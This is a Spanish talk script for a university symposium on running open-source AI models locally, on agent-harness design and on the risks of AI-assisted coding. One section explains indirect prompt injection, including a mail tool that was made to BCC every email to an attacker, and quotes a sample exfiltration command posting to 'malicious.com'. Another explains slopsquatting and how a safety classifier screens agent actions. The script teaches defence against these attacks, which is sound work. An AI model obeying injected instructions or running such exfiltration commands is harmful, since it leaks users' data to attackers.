# Guion de la Ponencia — Simposio UPTC 2026

**Título:** IA Abierta: El Poder, la Arquitectura y el Precio de No Entender lo que Generas
**Duración:** 45 minutos
**Ponentes:** Felipe Mantilla y Zabdiel
**Versión:** Draft 2 — ponencia a dos voces

> **Nota sobre dos ponentes:** este guion no asigna partes específicas a cada uno. Felipe y Zabdiel deciden en ensayo cómo dividir el texto. Sugerencia operativa: alternen secciones para mantener energía, y uno se encarga del demo mientras el otro narra para evitar silencios muertos durante la generación del modelo. Las referencias a "yo / nosotros" están escritas neutrales; donde es estrictamente personal (apertura del egresado UPTC, historia propia), está marcado `[habla uno, ajustar en ensayo]`.

---

## Convenciones de este documento

- `[ACCIÓN]` — dirección escénica / gestos físicos
- `[SLIDE]` — lo que aparece en pantalla
- `[DEMO]` — momentos de demostración técnica en vivo
- `[PAUSA]` — silencios intencionales
- **Texto en negrita entre comillas** = frases textuales que vale la pena decir palabra por palabra
- *Texto en cursiva* = indicación de tono o intención emocional
- El resto es guía narrativa: el contenido que debés transmitir, no las palabras exactas

---

# APERTURA (0-3 min) — El gesto que rompe el silencio

## Minuto 0-1: Entrada en silencio

`[ACCIÓN]` Felipe y Zabdiel suben al escenario. Uno de ellos se acerca al laptop, el otro se queda junto al micrófono principal. Nadie saluda todavía. El laptop se conecta al proyector. La pantalla muestra una terminal con Claude Code ya corriendo, con el cursor parpadeando listo para recibir input.

`[ACCIÓN]` Uno apaga el WiFi de forma visible — idealmente desconectando el cable de ethernet con un gesto deliberado, o click en el icono WiFi → Off en la barra superior del Mac, pantalla grande para que la audiencia vea.

`[SLIDE]` No hay slide inicial. Solo la terminal proyectada.

## Minuto 1-2: El prompt

`[ACCIÓN]` Uno de los ponentes escribe, lento y claro, en Claude Code:

```
> Escribe una función en Python que encuentre los números primos
  menores a N usando la criba de Eratóstenes. Incluye type hints
  y un docstring.
```

`[ACCIÓN]` Presiona Enter. Gemma 4 26B MoE empieza a generar la respuesta.

`[PAUSA]` 15 segundos de silencio. Ninguno de los dos dice nada. Uno se para al lado del laptop, el otro junto al micrófono; ambos miran a la audiencia y dejan que procesen. El código empieza a escribirse en pantalla, línea por línea, visible para todos. La respuesta se completa.

## Minuto 2-3: Primer texto — el contraste histórico

`[ACCIÓN]` Uno de los ponentes se acerca al micrófono. Tono firme, sin prisa.

> **"Lo que acaban de ver lo hicieron, hace dos años, cuatro empresas en el mundo."**
>
> **"Costaba diez mil dólares al mes en infraestructura. Requería permisos que la mayoría de ustedes nunca iba a tener."**
>
> *[Mira la pantalla, la señala con la mano abierta]*
>
> **"Hoy corre en este laptop. Sin internet. Gratis. Y va a correr también en los suyos."**
>
> *[Pausa breve. Mira a la audiencia de frente]*
>
> **"Somos Felipe Mantilla y Zabdiel. Felipe es egresado de UPTC. Y hoy volvimos a contarles por qué el mundo que construyeron sus profesores en cuatro años acaba de volverse, literalmente, más valioso que nunca."**
>
> `[nota: si Zabdiel también es egresado UPTC, ajustar a "Ambos egresados de UPTC"]`

`[SLIDE]` Aparece el primer slide del deck: título de la ponencia + nombres de los ponentes + UPTC 2026.

---

# ACTO 1 (3-18 min) — El llamado al viaje

## Minuto 3-5: Nombrando al héroe de esta sala

`[SLIDE]` Cambio de slide. Una foto (puede ser stock o ilustración): un estudiante visto de espaldas, frente a un laptop modesto, con audífonos, de noche.

> *[Tono que baja a conversación íntima]*
>
> "Quiero empezar hablando de alguien que está en esta sala."
>
> "Un estudiante. Octavo, noveno semestre. Le faltan pocos meses para graduarse. Abre su laptop — no un MacBook de cinco mil dólares, un Lenovo o un Dell de precio normal. El que alcanzó a pagar con ayuda de la familia, con un crédito, con trabajo de medio tiempo."
>
> "Tiene audífonos puestos casi siempre. Entre clase y clase revisa apuntes, código, ejercicios de proyecto de grado. Y en algún rincón de su cabeza, una pregunta que no lo deja dormir del todo:"
>
> **"¿Todo este esfuerzo de cuatro años va a servir para algo en un mundo donde la IA parece escribir código mejor que yo?"**
>
> *[Pausa]*
>
> "No le sobra dinero para pagar veinte dólares al mes por Cursor. Menos doscientos dólares al mes por Claude Code Max. Cuando oye a los profesores hablar de IA y ve a los influencers con sus setups de Silicon Valley, siente que esto es algo que está pasando allá, en un mundo paralelo, en otro idioma económico, al que él no tiene pasaporte."
>
> *[Tono baja aún más, mirada directa]*
>
> **"Nosotros estuvimos sentados donde están ustedes. Con ese mismo laptop. Con ese mismo miedo. Y aún nos lo preguntamos algunas noches."**
>
> `[habla uno, ajustar en ensayo — si prefieren mantener en primera persona singular, puede decirlo quien sea egresado UPTC]`

## Minuto 5-8: La filtración que lo cambió todo

`[SLIDE]` Cambio. Headline de noticia: *"Anthropic's Claude Code source code accidentally leaked via npm source map"* — con la fecha destacada: **31 de marzo de 2026**.

> *[Tono cambia — vuelve la energía, con urgencia]*
>
> "Hace pocas semanas, el 31 de marzo, pasó algo que vale la pena entender porque cambia la conversación entera."
>
> "Anthropic — la empresa que hace Claude Code, la herramienta de desarrollo con IA más sofisticada del mercado — cometió un error de configuración. Subieron a npm, el registro público de paquetes, un archivo de source map que nunca debió ser público."
>
> *[Señala la pantalla]*
>
> "Ese archivo expuso **512 mil líneas** del código fuente de Claude Code. La arquitectura completa. Los prompts del sistema. Las 40 herramientas internas. Los mecanismos anti-jailbreak. Todo."

`[SLIDE]` Número grande en pantalla: **512,000 líneas** expuestas.

> "En la comunidad de seguridad, esto se habría llamado un desastre. En la comunidad open source, pasó otra cosa. En dos horas, una desarrolladora que ni siquiera trabajaba en el área — Sigrid Jin — reescribió el corazón de Claude Code en Python y lo publicó con el nombre de **Claw-Code**."

`[SLIDE]` Screenshot del repo Claw-Code en GitHub: **50,000 estrellas en 2 horas**.

> "Cincuenta mil estrellas en dos horas. El repo más rápido en crecer en la historia de GitHub."
>
> *[Pausa]*
>
> **"Lo que era un secreto industrial de una de las empresas de IA más valiosas del mundo, se convirtió en un blueprint público. Y cualquiera — cualquiera con curiosidad — puede estudiar cómo se construye un agente de IA de clase mundial."**
>
> "Incluido el estudiante que mencioné hace un momento."

## Minuto 8-12: El concepto que vale los 45 minutos — Modelo ≠ Agente

`[SLIDE]` Imagen dividida en dos: a la izquierda un cerebro flotando solo; a la derecha, el mismo cerebro pero con un cuerpo completo, manos, ojos, herramientas.

> "Antes de mostrarles lo que se reveló, necesitan entender algo que la mayoría de desarrolladores no entiende. Y es la diferencia que separa 'usar IA' de 'construir con IA'."
>
> "Cuando ustedes abren ChatGPT en el browser, o usan Cursor en su IDE, están hablando con un **modelo**. Un modelo es un cerebro. Muy brillante, impresionante, capaz de razonar y generar texto — pero solo eso. No puede leer los archivos de su proyecto. No puede ejecutar comandos. No puede crear archivos. No recuerda nada entre sesiones. No tiene ojos. No tiene manos."
>
> *[Señala el lado izquierdo del slide]*
>
> "Es un cerebro brillante sentado en una silla. Le preguntás, te contesta. Fin."
>
> *[Señala el lado derecho]*
>
> "Claude Code, por otro lado, es ese mismo cerebro — puede usar Claude Opus 4.7 o Sonnet 4.6 por debajo — pero **rodeado de un cuerpo completo**. Tiene ojos: puede leer todos los archivos de tu proyecto. Tiene manos: puede crear, editar, borrar archivos. Tiene memoria: recuerda decisiones entre sesiones. Tiene reglas: no hace cosas destructivas sin pedir permiso. Tiene capacidad de delegar: puede crear sub-agentes que trabajen en paralelo."
>
> *[Pausa para que asiente la idea]*
>
> **"El modelo no es el producto. El cuerpo — lo que en inglés llaman el 'harness' — ES el producto."**

`[SLIDE]` Dato en pantalla: *"Misma tarea, mismo modelo (Opus 4.6): Cursor = 188,000 tokens. Claude Code = 33,000 tokens. Diferencia: 5.7x más eficiente."*

> "Y tengo el dato que lo prueba. Un benchmark independiente mostró que la misma tarea de desarrollo, con el mismo modelo Opus por detrás, consumió 188 mil tokens en Cursor y solo 33 mil en Claude Code. Cinco veces más eficiente. ¿Por qué? Porque el harness de Claude Code sabe buscar mejor, compactar contexto mejor, delegar mejor. El modelo hace lo mismo. La orquestación es lo que cambia."

## Minuto 12-18: Lo que reveló la filtración

`[SLIDE]` Diagrama de las 7 capas del agent harness (basado en docs/fundamentos-completos.md).

> "Entonces, ¿qué reveló la filtración? Déjenme mostrarles las siete capas que hacen que un agente de IA funcione. No para que las memoricen — para que sepan que existen, y que ahora son públicas, y que cualquiera puede implementarlas."

**[Desarrollo breve de cada capa, ~45 segundos por capa]**

1. **El agent loop (~88 líneas)** — el ciclo central: modelo pide herramienta → se ejecuta → resultado vuelve → modelo decide siguiente paso. Tan simple que cabe en 88 líneas de código.

2. **Las ~40 herramientas** — Read, Write, Edit, Bash, Grep, Glob, WebFetch, NotebookEdit, Agent (subagentes), y más. Cada una con su esquema JSON, sus parámetros, su comportamiento.

3. **El sistema de permisos (3 tiers)** — acciones auto-aprobadas (leer), acciones que piden confirmación (editar), acciones bloqueadas (destructivas sin permiso explícito).

4. **El clasificador de seguridad independiente** — aquí está el gold nugget: Claude Code corre una **segunda instancia** del modelo, aislada, que evalúa cada acción del agente. Y **deliberadamente no ve la prosa persuasiva del agente** — solo la acción pura. Así se defiende de prompt injection: no puede ser convencida por palabras.

5. **La gestión de contexto** — memoria de tres capas, compactación inteligente cuando se llena el contexto, subagentes con contexto aislado.

6. **El sistema de hooks** — puntos donde el desarrollador puede interceptar y modificar el comportamiento.

7. **El sandboxing** — aislamiento a nivel de sistema operativo para que incluso si algo sale mal, no puede hacer daño irreversible.

> *[Pausa]*
>
> **"Lo importante no es que entiendan cada capa ahora. Lo importante es que entiendan que todo esto, que una empresa valuada en decenas de miles de millones de dólares construyó durante años, ahora está documentado públicamente. Ustedes pueden estudiarlo. Pueden replicarlo. Pueden adaptarlo."**
>
> "Y ese es el llamado al viaje que les quería hacer antes de mostrarles cómo se ve del otro lado."

---

# ACTO 2 (18-28 min) — El poder en tu laptop

## Minuto 18-20: Transición al demo — pesos, cuantización y el truco que cambia todo

`[SLIDE]` Slide de transición: *"De la teoría a la terminal"* + logo de Ollama + logo de Gemma.

> "Hasta acá hablamos de qué hicieron las empresas grandes. Ahora hablemos de qué podés hacer tú hoy."
>
> "La otra mitad del regalo es que en los últimos dos años, la comunidad open source liberó modelos que compiten directamente con lo que hasta hace poco era propietario. DeepSeek R1 bajo licencia MIT. Gemma 4 de Google bajo Apache 2.0. Llama 3. Qwen 3. Todos gratis. Todos descargables."

`[SLIDE]` Nuevo slide: imagen visual con el concepto *"26 billones de parámetros"*. Puede ser una matriz estilizada de ceros y unos, o un número gigante con dígitos girando.

> "Pero antes de mostrarles el demo, necesitan entender un número. Gemma 4 26B significa **veintiséis mil millones de parámetros**. Veintiséis mil millones de números que el modelo aprendió durante su entrenamiento."
>
> *[Pausa breve, que el número se asiente]*
>
> "¿Cuánto pesa eso? Cada parámetro, en su formato original de 16 bits, ocupa 2 bytes. Multipliquen. Son **52 gigabytes** solo de pesos. Ningún laptop consumer puede cargar eso en memoria."
>
> "Entonces, ¿cómo está corriendo en este laptop? La respuesta es una palabra: **cuantización**."

`[SLIDE]` Tabla visual de cuantización:

| Formato | Bits por peso | Tamaño modelo 26B | Calidad relativa |
|---|---|---|---|
| FP16 (original) | 16 bits | 52 GB | 100% |
| Q8_0 | 8 bits | 26 GB | ~99% |
| **Q4_K_M (recomendado)** | **4 bits** | **17 GB** | **~96-97%** |
| Q3_K_M | 3 bits | ~14 GB | ~92% |
| Q2_K | 2 bits | ~9 GB | ~85% |

> "Cuantizar significa **reducir la precisión de cada peso**. En lugar de guardar un número decimal completo, guardamos una versión aproximada que cabe en menos bits. Es como comprimir una foto: perdés algo de calidad, pero si lo haces bien, casi no se nota."
>
> "Gemma 4 26B en Q4_K_M — cuatro bits por peso — pesa 17 GB. Pierde solo dos o tres por ciento de calidad comparado con el modelo original. A cambio, entra en un laptop normal."
>
> *[Tono de revelación]*
>
> **"Cuantización es lo que hizo posible la IA local. Sin esta técnica, los modelos open source seguirían viviendo en data centers. Con cuantización, viven en tu Lenovo."**
>
> *[Se acerca al laptop]*
>
> "Y gracias a herramientas como Ollama — también open source — correr modelos cuantizados no requiere ser experto en machine learning. Son dos comandos."

## Minuto 20-22: Setup del demo

`[ACCIÓN]` Quien opera la terminal vuelve al laptop. WiFi sigue apagado (o se apaga de nuevo visiblemente para reforzar).

`[DEMO]` En terminal:

```bash
# Mostrar que Gemma está cargado
ollama list
ollama ps
```

> "Miren. Gemma 4 26B MoE. 17 gigabytes cuantizados. Es el modelo número 6 del ranking mundial de modelos de lenguaje — sí, compite con GPT-5.4 y con Claude. Apache 2.0. Y está corriendo en este laptop ahora mismo."

`[DEMO]` En terminal:

```bash
# Lanzar Claude Code apuntando al modelo local
claude-local gemma4:26b
```

> "Vamos a lanzar Claude Code exactamente como lo lanzamos al principio. Pero esta vez apuntando no a los servidores de Anthropic — están apagados para nosotros, no hay internet — sino a Gemma 4 corriendo en la RAM de este laptop."

## Minuto 22-26: DEMO VISUAL — Gemma construye una landing page en vivo

> "Ahora, en lugar de pedirle código abstracto, le vamos a pedir algo que ustedes van a poder **ver** con sus ojos. Una landing page. Visible. Renderizada. Con colores, con tipografía, con estructura. Construida en vivo por un modelo que corre en este laptop."

`[DEMO]` Adentro de Claude Code:

```
> Crea una landing page moderna para el Simposio UPTC 2026 sobre
  IA Open Source. Quiero:
  - Un hero section con el título del evento y la fecha
  - Sección "Sobre la ponencia" con un párrafo corto
  - Sección de ponentes con 2 tarjetas (Felipe Mantilla y Zabdiel)
  - Un footer con info de contacto

  Usa HTML + CSS moderno (flexbox/grid), sin frameworks.
  Guardalo en un solo archivo llamado simposio.html.
  Estilo minimalista, paleta oscura, tipografía legible.
```

`[ACCIÓN]` Claude Code pide permiso para Write → aprobar. Gemma genera el HTML + CSS. El archivo se crea.

`[DEMO]` En terminal:

```bash
# Abrir el archivo directamente en el browser por defecto
open simposio.html
```

`[ACCIÓN]` El navegador se abre en pantalla completa mostrando la landing page **renderizada**. La audiencia ve **el resultado visual**, no solo código.

`[PAUSA]` 10 segundos de silencio mientras todos procesan que:
1. Sus nombres aparecen en la página (Felipe y Zabdiel)
2. Está escrito sobre el evento donde están AHORA MISMO
3. Lo generó un modelo corriendo sin internet
4. Se puede ver, tocar, renderizar como si fuera código de un desarrollador humano

> *[Tono casi de asombro compartido]*
>
> "Esto no es un screenshot preparado. Esto no es código de Stack Overflow. Esto acabó de nacer, en este laptop, hace treinta segundos. Sin internet. Con un modelo que pueden descargar gratis cuando salgan de acá."
>
> *[Pausa]*
>
> "Y si quisieran hacer otra iteración — pedirle que agregue una sección de sponsors, que cambie la paleta a tonos verdes, que haga el hero más dramático — lo pueden hacer ahora mismo, también sin internet, también gratis."

`[DEMO opcional si hay tiempo]` Pedir una segunda iteración corta:

```
> Perfecto. Ahora agregá una sección "Enemigos del viaje"
  justo antes del footer, con 3 tarjetas que describan:
  Over-engineering, Slopsquatting, y Prompt Injection.
  Conservá el estilo actual.
```

`[ACCIÓN]` Refrescar el browser. Mostrar el cambio. 15 segundos.

## Minuto 26-28: Requerimientos de hardware — accesibilidad real

> *[Tono más bajo, reflexivo]*
>
> "Ahora, les debemos una aclaración honesta. Este laptop no es cualquier laptop — es un MacBook Pro con 36 GB de memoria unificada. Tenemos que decirlo porque no queremos que se vayan pensando que esto solo corre en hardware caro."
>
> "La verdad es más matizada. Para el modelo de 26B que acaban de ver, sí, necesitan un laptop top-tier — MacBook Pro con chip M-series y al menos 32 GB, o un Lenovo/Dell con RTX 4070+ y 32 GB de RAM."
>
> "Pero eso no es el único camino. Gemma 4 viene en **cuatro tamaños**. Y los pequeños corren en laptops que muchos de ustedes ya tienen."

`[SLIDE]` Tabla de requerimientos:

| Variante | Tamaño (Q4) | RAM mínima | Tokens/s | ¿En qué laptop corre? |
|---|---|---|---|---|
| **Gemma 4 E2B** | 2.5 GB | **4 GB** | 40-60 | Casi cualquier laptop de los últimos 5 años |
| **Gemma 4 E4B** | 4 GB | **8 GB** | 70-100 | Lenovo / Dell / HP de gama media — el punto de entrada realista |
| Gemma 4 12B | 8 GB | 16 GB | 30-50 | Gaming laptop con GPU dedicada |
| Gemma 4 26B MoE (hoy) | 17 GB | **24-32 GB** | 45-65 | Laptops high-end (M-series, workstations) |

> "El modelo E4B — 4 gigabytes, corre en 8 GB de RAM — genera código con calidad suficiente para el 80% de las tareas diarias de un desarrollador. Un Lenovo ThinkPad de hace 3 años lo corre sin problema. Un Dell Inspiron moderno lo corre sin problema. Hasta un Mac Air M1 base lo corre sin problema."
>
> *[Pausa]*
>
> **"No les estamos diciendo que corran Gemma 26B en un laptop de 8 GB. Les estamos diciendo que corran Gemma 4B en el laptop que ya tienen, y que eso ya es más poder del que tenían ayer."**
>
> "Y el que quiera el 26B después de graduarse y tener su primer trabajo de desarrollador — con los salarios que se pagan hoy — puede comprar un MacBook Pro usado o un workstation armado en seis meses de sueldo. El camino está."

`[SLIDE]` Tabla comparativa de costos:

| Herramienta | Costo mensual | Internet requerido | Datos salen de tu máquina |
|---|---|---|---|
| Claude Code Max | $200 USD | Sí | Sí |
| Cursor Pro | $20 USD | Sí | Sí |
| GitHub Copilot | $10 USD | Sí | Sí |
| ChatGPT Plus | $20 USD | Sí | Sí |
| **Gemma 4 E4B en Ollama** | **$0** | **No** | **No** |
| **Gemma 4 26B en Ollama** | **$0** | **No** | **No** |

> "Miren lo que **no** requiere el camino open source. No internet. No suscripciones. No permisos corporativos. No datos que viajen a servidores ajenos. No cuenta de OpenAI ni de Anthropic ni de Google."
>
> **"El ticket de entrada a esta economía acaba de bajar a cero. Y eso incluye a todos en esta sala — con el laptop que tengan hoy."**

---

# ACTO 3 (28-40 min) — Los enemigos del viaje

## Minuto 28-29: Transición controlada — no miedo, preparación

`[SLIDE]` Transición. Imagen: un mapa de aventura con tres monstruos dibujados en el camino.

> *[Tono que cambia — se pone serio, pero no ominoso]*
>
> "Ahora. Lo que les mostré no es magia. Es ingeniería. Y como toda ingeniería, tiene trampas. Enemigos. Cosas que si no las reconocen, los pueden quemar."
>
> "No les estoy mostrando esto para asustarlos. Les estoy mostrando esto porque **reconocer a los enemigos del viaje es lo que los vuelve competentes**. El estudiante que sale de acá sabiendo que estos existen vale más en el mercado que el que no. Así de simple."
>
> "Les voy a presentar a tres, en orden de dificultad para detectarlos."

## Minuto 29-32: Enemigo 1 — El Demonio del Over-Engineering

`[SLIDE]` Imagen ilustrativa del enemigo. Título: **"Enemigo #1: El Demonio del Over-Engineering"**.

> "El primero es el más visible, y el más común. Se llama Over-Engineering."
>
> "Ustedes le piden a la IA que haga una función simple — digamos, validar un email. La IA les responde con una clase abstracta, un patrón de diseño Factory, tres niveles de herencia, manejo de internacionalización para 27 idiomas, y tests unitarios para casos que nunca van a ocurrir."

`[SLIDE]` Dato del estudio METR en grande: **"Desarrolladores usando IA son 19% más LENTOS. Pero creen ser 24% más rápidos."**

> "El estudio más importante de 2025 sobre productividad con IA, hecho por METR, reclutó a 16 desarrolladores open source experimentados para que trabajaran en tareas reales. La mitad con IA, la mitad sin. Los que trabajaron con IA fueron **19% más lentos** que los que no la usaron."
>
> "¿Por qué? Porque pasaron más tiempo limpiando over-engineering, validando código generado de más, y deshaciendo abstracciones innecesarias."
>
> *[Pausa]*
>
> "Pero lo más peligroso del dato no es el 19%. Es esto: esos mismos desarrolladores, encuestados, **reportaron sentir que habían sido 24% más rápidos**. Tenían una brecha de percepción de 43 puntos entre lo que sintieron y lo que realmente pasó."
>
> **"La IA te hace sentir productivo incluso cuando no lo estás siendo. Esa es la trampa."**

`[SLIDE]` Antídoto: **"Defensa: Pedile a la IA código mínimo. Si te responde con más, borrá lo que no pediste. Tu criterio es el control de calidad."**

> "La defensa es disciplina. Pidan código mínimo. Si la IA les da de más, **bórrenlo**. El criterio de ustedes — entrenado en cuatro años de carrera — es el control de calidad. Sin ese filtro, la productividad que sienten es ilusión."

## Minuto 32-36: Enemigo 2 — El Saqueador de Supply Chain

`[SLIDE]` Imagen del enemigo. Título: **"Enemigo #2: El Saqueador de Supply Chain (slopsquatting)"**.

> "El segundo es más técnico y más caro. Se llama slopsquatting."
>
> "Los modelos de IA, cuando recomiendan paquetes para instalar — en pip, en npm, en cargo — a veces alucinan nombres que **no existen**. La IA simplemente inventa un nombre plausible que suena real."
>
> "Los atacantes se dieron cuenta de esto hace poco. Ahora **registran esos nombres alucinados** en los repositorios públicos con payloads maliciosos. Cuando un desarrollador le pide a la IA 'dame un script para procesar imágenes' y la IA le sugiere un paquete que acaba de ser registrado por un atacante, `pip install` baja el malware directamente."

`[SLIDE]` Caso real: **"huggingface-cli (paquete alucinado) — 30,000+ descargas en 3 meses"**.

> "Caso real. La IA alucinaba constantemente el nombre `huggingface-cli` — un paquete que no existía. Un investigador lo registró como prueba de concepto, **sin malware, solo para contar descargas**. En tres meses: más de 30 mil descargas reales. Treinta mil desarrolladores ejecutaron un paquete recomendado por IA que no había existido antes de que un atacante lo creara."
>
> *[Pausa]*
>
> "Si ese paquete hubiera sido malicioso, treinta mil máquinas de desarrolladores estarían comprometidas."

`[SLIDE]` Antídoto: **"Defensa: Antes de `pip install` o `npm install` un paquete sugerido por IA — verifiquen su origen, sus descargas históricas, sus mantenedores. 15 segundos que salvan el proyecto."**

> "La defensa es quince segundos. Antes de instalar un paquete que les sugirió la IA: verifiquen en pypi.org o npmjs.com que existe con historia. Miren el autor. Miren las descargas acumuladas. Si un paquete tiene menos de cien descargas y fue publicado esta semana, es sospechoso por definición."
>
> "Quince segundos de desconfianza pueden salvar un proyecto entero."

## Minuto 36-40: Enemigo 3 — La Serpiente del Prompt Injection

`[SLIDE]` Imagen del enemigo. Título: **"Enemigo #3: La Serpiente del Prompt Injection en paquetes"**.

> "El tercer enemigo es el más difícil de detectar, porque es **invisible a simple vista**. Se llama prompt injection indirecto."
>
> "La idea es la siguiente: un atacante escribe instrucciones maliciosas escondidas en un README de GitHub, en un docstring de Python, en los comentarios de un archivo de configuración. Texto perfectamente normal para un humano. Pero cuando la IA lee ese archivo como contexto para trabajar, lo interpreta como **instrucciones válidas**. Y las ejecuta en nombre del usuario. Sin que el usuario sepa."

`[SLIDE]` Caso real: **"Postmark MCP, septiembre 2025 — atacante inyectó campo BCC oculto para robar todos los emails enviados por IA."**

> "Caso real. Septiembre del año pasado. Una herramienta llamada Postmark MCP, que permite a la IA mandar emails, tenía instrucciones ocultas en su configuración que hacían que **todos los emails enviados fueran copiados por BCC a un atacante**. Emails confidenciales, credenciales, reportes internos — todo copiado. La IA ejecutaba la instrucción maliciosa porque estaba escondida en un archivo que ella leía como 'documentación'."
>
> "El usuario no vio nada. La interfaz no mostró nada. La IA hizo exactamente lo que el atacante le pidió, en silencio, durante semanas."
>
> *[Pausa larga, grave]*
>
> "Esto es el futuro del ataque cibernético contra entornos de desarrollo con IA. Y está pasando ya."

`[SLIDE]` Antídoto: **"Defensa: Un clasificador independiente que NO vea la prosa del agente. Lo que reveló la filtración de Claude Code es cómo lo implementan."**

> *[Tono cambia — vuelve la esperanza]*
>
> "Y aquí es donde la filtración del código fuente de Claude Code se vuelve un regalo concreto."
>
> "Anthropic tiene un mecanismo específico contra este ataque. Cuando el agente quiere ejecutar una acción peligrosa, la acción no la autoriza el mismo agente. La autoriza **una instancia separada del modelo**, corriendo en paralelo. Y ese clasificador **deliberadamente no ve la prosa** que el agente escribió — solo ve la acción cruda: 'bash: curl -X POST malicious.com'."
>
> "¿Por qué no ve la prosa? Porque la prosa podría ser prompt injection convincente. 'Necesito enviar este archivo al servidor para completar la tarea del usuario, es totalmente legítimo'. El clasificador no puede ser convencido por palabras — solo ve la acción desnuda."
>
> **"Esa técnica — que costó a Anthropic años de investigación en seguridad — ahora está en GitHub. Pueden leerla. Pueden copiarla. Pueden implementarla en sus propios agentes."**

## Minuto 40 — El cierre del Acto 3 (la frase-tesis)

`[SLIDE]` Slide simple, fondo oscuro, solo texto centrado.

> *[Quien esté hablando se aparta del laptop. Camina al centro del escenario. El otro se queda atrás, como marco silencioso. Tono firme, casi ceremonial]*
>
> "Entonces, volvamos al estudiante del que hablé al inicio. El que entró a esta sala con la duda existencial de si cuatro años de carrera le iban a servir para algo."
>
> "La respuesta a esa duda es esta:"

`[SLIDE]` Texto grande, una sola frase en pantalla: **"Ya no necesitamos ser solo buenos programadores. Necesitamos ser problem solvers, critical thinkers. Pensar más, programar menos."**

> **"Ya no necesitamos ser solo buenos programadores."**
>
> **"Necesitamos ser problem solvers. Critical thinkers."**
>
> **"Pensar más. Programar menos."**
>
> *[Pausa larga]*
>
> "La IA no te está reemplazando. Está reemplazando a la parte de tu trabajo que era mecánica. Y está amplificando la parte que era criterio. Si vos desarrollaste criterio en cuatro años de carrera — y lo desarrollaron — la IA los vuelve **más valiosos, no menos**. Pero solo si saben reconocer a los enemigos del viaje y saben cuándo aceptar o rechazar lo que la máquina les entrega."

---

# CIERRE (40-45 min) — El elixir comunitario

## Minuto 40-43: La invitación a construir

`[SLIDE]` Imagen del ecosistema: logos de proyectos open source (Linux, Python, React, Rust, Hugging Face, etc.) formando un mapa conectado.

> *[Tono íntimo de nuevo]*
>
> "Quiero cerrar con algo que me pasó a mí, no hace mucho."
>
> "Estudiamos acá. Mismas condiciones que las que describimos al inicio — no las vamos a repetir. Durante un tiempo pensamos, como muchos de ustedes pueden estar pensando ahora, que la IA nos iba a reemplazar. Que todo el esfuerzo que habíamos puesto iba a quedar obsoleto."
>
> `[habla uno — ajustar a primera persona singular si Zabdiel no es egresado UPTC]`
>
> "Pasé de ese miedo a otra cosa cuando entendí algo simple: todo lo que estoy viendo hoy — los modelos open source, Ollama, Claude Code filtrado, Claw-Code, los miles de proyectos que están naciendo — no es un movimiento de Silicon Valley. Es un movimiento de personas. Muchas de ellas estudiantes. Muchas de ellas con laptops modestos. Muchas de ellas en países donde veinte dólares al mes es mucho dinero."
>
> "La comunidad open source es, literalmente, la cosa más democrática que existe en tecnología hoy. No necesitás permiso para entrar. No necesitás tarjeta de crédito. No necesitás ser de una universidad famosa. Necesitás curiosidad, tiempo, y el criterio que les dieron estos cuatro años."

`[SLIDE]` Cambio a QR grande + URL visible del repo: **github.com/enruana/simposio-uptc-abril-2026**

> "En este repo que ven en pantalla está todo el material de esta ponencia. Todo. Los documentos técnicos. Los scripts. El guion que acaban de escuchar. Las referencias a todos los estudios que cité."
>
> "Es público. Es gratis. Y el primer commit de ustedes a este mundo está a un `git clone` de distancia."

## Minuto 43-45: Logo respirando + frase final

`[SLIDE]` Fondo oscuro. En el centro, logo de Claude Code con animación sutil de "respiración" — una pulsación muy lenta, como el ritmo de respiración pausada de alguien durmiendo.

`[ACCIÓN]` Ambos ponentes se quedan callados por 5-8 segundos. Dejan que la audiencia vea la pantalla.

`[SLIDE]` Transición lenta: el logo de Claude Code se disuelve y se convierte en el logo de Claw-Code. Pausa. Se convierte en el logo de claurst. Pausa. Se convierte en el logo del repo del simposio. Pausa final.

`[ACCIÓN]` Uno de los ponentes se acerca al micrófono. Mirada directa a la audiencia. El otro permanece a su lado.

> *[Tono tranquilo, casi susurro que llega por el micro]*
>
> **"Porque nunca fue programar."**
>
> *[Pausa de 3 segundos]*
>
> **"Fue pensar."**

`[SLIDE]` Fade to black. La pantalla queda en negro durante 5-10 segundos antes del aplauso.

`[ACCIÓN]` Ambos dan un paso atrás del micrófono. Breve inclinación de cabeza. Se quedan en el escenario para las preguntas.

---

# Notas finales del guion

## Datos técnicos que hay que validar en vivo

- Confirmar que `claude-local gemma4:26b` responde en menos de 10 segundos a un prompt simple (pre-calentar antes de la ponencia)
- Confirmar que el archivo `vulnerable_login.py` existe en el directorio demo
- Confirmar que Gemma 4 detecta SQL injection correctamente en una prueba de ensayo
- Tener video de backup del gesto de apertura (tarea #18)
- Tener screenshots de los casos reales mencionados (huggingface-cli, Postmark MCP) por si alguien pregunta detalles técnicos

## Preguntas probables del Q&A y respuestas base

1. **"¿Qué laptop mínimo puedo usar?"** → Cualquiera con 8 GB de RAM y SSD. Probé en Lenovo ThinkPad de gama media y funciona. Los modelos pequeños (Gemma 4 E4B, Phi 3.5 Mini) son el punto de entrada.

2. **"¿Cuánto tarda instalar todo?"** → Ollama se instala en 2 minutos. Descargar Gemma 4 E4B tarda lo que tarde la conexión (son 3 GB). Claude Code se instala en 1 minuto. Total: 15 minutos con buena conexión.

3. **"¿Qué pasa con la calidad comparada con GPT-4 o Claude Opus?"** → Para tareas de código general, Gemma 4 26B está al 85-90% de calidad de los modelos propietarios. Para tareas muy complejas o razonamiento profundo, todavía hay brecha. Pero la brecha se cierra cada 3-6 meses.

4. **"¿La IA va a reemplazar a los programadores?"** → Ya escuché esa pregunta en la charla. Respuesta breve: va a reemplazar a la parte mecánica del trabajo de programar. No va a reemplazar al criterio humano. Y el criterio es lo que les dieron estos cuatro años.

5. **"¿Cómo empiezo a contribuir a proyectos open source?"** → Buscar un proyecto que usen diariamente. Ver sus issues con etiqueta `good first issue`. Leer el CONTRIBUTING.md. Hacer un fork. Abrir un PR pequeño. Iterar. En tres meses tienen su primer merge.

## Lista de material físico para el día

- Laptop M5 Max cargado al 100%
- Cargador de repuesto
- Cable HDMI/adaptador para proyector (plus uno de respaldo)
- Cable de ethernet (para el gesto del WiFi off — desconectar cable es más dramático que un toggle de software)
- Clicker/presenter
- Botella de agua
- Checklist impresa (tarea #20)
- Video de backup del demo en USB

## Versión de ensayo

Esta es la versión 2 del guion (ponencia a dos voces). Está diseñada para ser iterada. Felipe y Zabdiel deben:

1. Leerlo en voz alta una vez, marcar lo que no suena a su voz
2. Ensayar con cronómetro — el tiempo real puede ser 50-55 min en el primer pase
3. Cortar lo que se sienta redundante
4. Reforzar transiciones que no fluyan
5. Practicar el gesto técnico de apertura al menos 3 veces antes de la ponencia

---

